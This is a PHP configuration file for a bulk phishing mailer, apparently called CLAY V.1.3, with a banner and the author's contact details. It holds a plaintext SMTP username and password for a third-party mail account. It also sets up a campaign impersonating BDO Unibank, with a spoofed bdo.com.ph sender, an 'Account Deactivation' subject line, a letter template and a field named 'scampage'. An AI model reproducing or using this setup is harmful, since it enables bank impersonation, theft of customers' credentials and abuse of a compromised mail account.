<?php

/*
   ╔╦╗╦╔═╗╔═╗  ╔═╗╔═╗╔╦╗╦ ╦╔═╗  
    ║ ║╠═╝╚═╗  ╚═╗║╣  ║ ║ ║╠═╝  
    ╩ ╩╩  ╚═╝  ╚═╝╚═╝ ╩ ╚═╝╩  
──────────────────────────────── 
* Use of other tools already provided by owner CLAY. If you have some problem.

* You can contact the manufacturer of the CLAY support if you need help or find some error in sender CLAY V.1.3.

* If You Want to Contact The CLAY Provider You Can Via Contact Below
  FB       : https://www.facebook.com/vidz.sianipar (Vidz)
  Whatsapp : +6282370721424
//Regards

* Use wisely. We are not responsible for the GX40 hacking. Because we provide the CLAY As Sender Email basically.

date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "send.one.com",
        "port"     => "465",
        "username" => "info@brandsbook.co.uk",
        "password" => "Ad23e3e@#wedf"
    ],

];
/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/test.txt",
    "fromname"       => "BDO Unibank",
    "frommail"       => "##randstring####randstring##callcenter##randstring##@bdo.com.ph",
    "subject"        => "BDO Online Banking Account Deactivation",
    "msgfile"        => "file/letter/letter.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://hootsuite.com"],
];
